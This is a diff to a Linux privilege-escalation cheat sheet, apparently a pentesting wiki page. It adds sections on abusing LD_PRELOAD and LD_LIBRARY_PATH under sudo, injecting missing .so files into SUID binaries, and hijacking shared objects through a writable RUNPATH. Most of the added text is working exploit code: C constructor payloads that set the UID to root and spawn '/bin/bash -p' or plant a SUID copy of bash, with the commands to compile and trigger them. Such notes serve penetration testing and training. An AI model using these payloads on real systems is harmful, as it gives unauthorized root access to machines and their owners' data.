@@ -139,7 +139,7 @@ sudo su -
 
 Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO\_KILLER)
 
-#### NOPASSWD
+### NOPASSWD
 
 Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.
 
@@ -157,7 +157,7 @@ sudo vim -c '!sh'
 sudo -u root vim -c '!sh'
 ```
 
-#### LD\_PRELOAD and NOPASSWD
+### LD\_PRELOAD & **LD\_LIBRARY\_PATH**
 
 If `LD_PRELOAD` is explicitly defined in the sudoers file
 
@@ -181,6 +181,96 @@ void _init() {
 ```
 
 Execute any binary with the LD\_PRELOAD to spawn a shell : `sudo LD_PRELOAD=<full_path_to_so_file> <program>`, e.g: `sudo LD_PRELOAD=/tmp/shell.so find`
+
+{% hint style="danger" %}
+A similar privesc can be abused if the attacker controls the **LD\_LIBRARY\_PATH** env variable because he controls the path where libraries are going to be searched.
+{% endhint %}
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        unsetenv("LD_LIBRARY_PATH");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+```bash
+# Compile & execute
+cd /tmp
+gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
+sudo LD_LIBRARY_PATH=/tmp <COMMAND>
+```
+
+### SUID Binary – .so injection
+
+If you find some weird binary with **SUID** permissions, you could check if all the **.so** files are **loaded correctly**. To do so you can execute:
+
+```bash
+strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
+```
+
+For example, if you find something like: _pen(“/home/user/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (No such file or directory)_ you can exploit it.
+
+Create the file _/home/user/.config/libcalc.c_ with the code:
+
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+static void inject() __attribute__((constructor));
+
+void inject(){
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+}
+```
+
+Compile it using:
+
+```bash
+gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
+```
+
+And execute the binary.
+
+## Shared Object Hijacking
+
+```bash
+# Lets find a SUID using a non-standard library
+ldd some_suid
+something.so => /lib/x86_64-linux-gnu/something.so
+
+# The SUID also loads libraries from a custom location where we can write
+readelf -d payroll  | grep PATH
+0x000000000000001d (RUNPATH)            Library runpath: [/development]
+```
+
+Now that we have found a SUID binary loading a library from a folder where we can write, lets create the library in that folder with the necessary name:
+
+```c
+//gcc src.c -fPIC -shared -o /development/libshared.so
+#include <stdio.h>
+#include <stdlib.h>
+
+static void hijack() __attribute__((constructor));
+
+void hijack() {
+        setresuid(0,0,0);
+        system("/bin/bash -p");
+}
+```
+
+If you get an error such as
+
+```shell-session
+./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
+```
+
+that means that the library you have generated need to have a function called `a_function_name`.
 
 #### CVE-2019-14287
 
